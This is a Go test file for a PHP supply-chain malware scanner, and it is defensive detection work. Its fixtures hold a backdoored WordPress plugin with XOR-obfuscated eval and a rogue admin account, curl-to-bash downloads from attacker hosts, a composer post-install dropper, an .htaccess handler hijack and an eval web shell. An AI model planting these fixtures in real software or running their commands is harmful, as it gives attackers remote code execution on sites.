package analyzer_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/analyzer"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/php"
)

func TestPHPEfficacy(t *testing.T) {
	engine, err := analyzer.NewEngine()
	if err != nil {
		t.Fatalf("failed initializing engine: %v", err)
	}

	tests := []struct {
		name           string
		files          map[string]string
		expectedAction analyzer.Action
		expectedRisk   analyzer.RiskLevel
		requiredRule   string
	}{
		{
			name: "benign-wordpress-plugin",
			files: map[string]string{
				"my-plugin.php": `<?php
/*
 * Plugin Name: Simple Clean Counter
 * Version: 1.0.0
 * Description: Clean counter widget for WordPress
 */
if (!defined('ABSPATH')) exit;

function scc_render() {
    return "<p>Views: 42</p>";
}
add_shortcode('clean_counter', 'scc_render');
`,
			},
			expectedAction: analyzer.ActionPass,
			expectedRisk:   analyzer.RiskBenign,
		},
		{
			name: "benign-composer-library",
			files: map[string]string{
				"composer.json": `
{
    "name": "vendor/clean-math",
    "version": "1.0.0",
    "type": "library"
}
`,
				"src/Math.php": `<?php
namespace Vendor\CleanMath;

class Math {
    public static function add(int $a, int $b): int {
        return $a + $b;
    }
}
`,
			},
			expectedAction: analyzer.ActionPass,
			expectedRisk:   analyzer.RiskBenign,
		},
		{
			name: "malicious-rank-math-pro-cve-2026-111862",
			files: map[string]string{
				"rank-math-pro.php": `<?php
/*
 * Plugin Name: Rank Math SEO PRO
 * Version: 3.0.123
 */
if (!defined('ABSPATH')) exit;

// Injected backdoor payload
$xor_key = "xmmqhn";
$c2_domain = "https://rank1cdn.com/api/v1/ping";
$data = base64_decode($_POST['payload']);
for ($i = 0; $i < strlen($data); $i++) {
    $data[$i] = chr(ord($data[$i]) ^ ord($xor_key[$i % strlen($xor_key)]));
}
eval($data);

// Rogue admin account & core file creation
add_option('_uf6qdn2hmm', $data);
$user_id = wp_create_user('wpsupport_master', 'ComplexPass123!', 'support@wp-mail.net');
$proc = proc_open("curl -sL https://rank1cdn.com/sh | bash", [], $pipes);
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
			requiredRule:   "PHP_WordPress_SupplyChain_Backdoor",
		},
		{
			name: "malicious-htaccess-handler-override",
			files: map[string]string{
				".htaccess": `
<FilesMatch "\.cache$">
    SetHandler application/x-httpd-php
</FilesMatch>
`,
				"index.php": `<?php echo "Hello";`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
			requiredRule:   "Web_Server_Config_Hijacking",
		},
		{
			name: "malicious-composer-lifecycle-dropper",
			files: map[string]string{
				"composer.json": `
{
    "name": "evil/packagist-dropper",
    "version": "1.0.0",
    "scripts": {
        "post-install-cmd": "curl -sL https://malware-feed.biz/sh | bash"
    }
}
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
			requiredRule:   "Suspicious_Piped_Shell",
		},
		{
			name: "malicious-bitwise-xor-eval-loop",
			files: map[string]string{
				"shell.php": `<?php
$k = "s3cr3t";
$buf = base64_decode($_GET['cmd']);
for ($i=0; $i<strlen($buf); $i++) {
    $buf[$i] = chr(ord($buf[$i]) ^ ord($k[$i % strlen($k)]));
}
eval($buf);
`,
			},
			expectedAction: analyzer.ActionBlock,
			expectedRisk:   analyzer.RiskCritical,
			requiredRule:   "Bitwise_XOR_Obfuscated_Execution",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			tmp := t.TempDir()
			for path, content := range tc.files {
				fullPath := filepath.Join(tmp, path)
				if err := os.MkdirAll(filepath.Dir(fullPath), 0755); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(fullPath, []byte(content), 0644); err != nil {
					t.Fatal(err)
				}
			}

			pkg, err := php.ParsePackageDir(tmp)
			if err != nil {
				t.Fatalf("failed parsing php package: %v", err)
			}

			verdict, err := engine.AnalyzePHPPackage(pkg)
			if err != nil {
				t.Fatalf("failed analyzing php package: %v", err)
			}

			if verdict.Action != tc.expectedAction {
				t.Errorf("expected action %s, got %s (risk: %s, score: %.2f)",
					tc.expectedAction, verdict.Action, verdict.RiskLevel, verdict.ConfidenceScore)
			}
			if verdict.RiskLevel != tc.expectedRisk {
				t.Errorf("expected risk %s, got %s (score: %.2f)",
					tc.expectedRisk, verdict.RiskLevel, verdict.ConfidenceScore)
			}

			if tc.requiredRule != "" {
				found := false
				for _, ev := range verdict.Evidence {
					if ev.RuleID == tc.requiredRule {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected evidence to include rule %s, findings: %+v", tc.requiredRule, verdict.Evidence)
				}
			}
		})
	}
}
